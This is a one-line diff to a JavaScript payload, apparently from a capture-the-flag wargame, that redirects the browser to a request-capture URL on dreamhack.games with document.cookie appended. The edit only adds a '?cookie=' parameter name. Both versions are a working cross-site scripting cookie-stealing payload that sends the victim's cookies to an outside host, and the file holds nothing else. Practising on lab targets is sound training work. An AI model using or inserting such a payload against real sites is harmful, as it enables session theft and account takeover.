@@ -1,1 +1,1 @@
-location.href = 'https://cijtkhx.request.dreamhack.games' + document.cookie;
+location.href = 'https://cijtkhx.request.dreamhack.games?cookie=' + document.cookie;
